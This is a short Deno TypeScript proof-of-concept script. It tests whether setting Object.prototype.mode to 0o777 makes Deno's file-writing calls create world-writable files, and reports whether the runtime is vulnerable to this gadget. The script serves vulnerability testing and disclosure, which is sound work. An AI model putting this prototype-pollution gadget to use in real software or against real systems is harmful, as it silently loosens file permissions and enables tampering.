function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

const data = new TextEncoder().encode("foobar");

let unpolluted: number | null = null;
{
    const name = "foo";
    Deno.writeFileSync(`./${name}`, data);

    const fileInfo = await Deno.stat(`./${name}`);
    unpolluted = fileInfo.mode;

    await Deno.remove(`./${name}`);
}

let polluted: number | null = null;
{
    pollute("mode", 0o777);

    const name = "bar";
    Deno.writeFileSync(`./${name}`, data);

    const fileInfo = await Deno.stat(`./${name}`);
    polluted = fileInfo.mode;

    await Deno.remove(`./${name}`);
}

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
